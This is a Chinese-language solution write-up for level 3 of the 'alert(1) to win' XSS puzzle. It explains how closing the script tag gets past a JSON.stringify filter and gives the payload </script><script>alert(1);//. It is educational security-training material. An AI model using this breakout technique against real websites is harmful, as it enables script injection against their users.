## [[alert(1) to win](https://alf.nu/alert1)] [[Level 03 - JSON](https://alf.nu/alert1)] [[解题报告](http://exp-blog.com/2019/08/04/pid-3893/)]

------

## 题目

```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

------

## 解题报告

从代码可知对输入做了 `stringify` 过滤，关于其功能详见 [这里](https://www.runoob.com/js/javascript-json-stringify.html) 

简单来说就是把 `"` 和 `\` 都转义了，导致无法直接闭合函数。

但是闭合 `<script>` 就可以了，构造 payload 如下 （此处没有闭合后半段的双引号，而是通过行注释 `//` 屏蔽掉）：

```javascript
</script><script>alert(1);//
```

![](http://exp-blog.com/wp-content/uploads/2019/08/b4c0014851b065b5d1bc6f697b8217ca.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
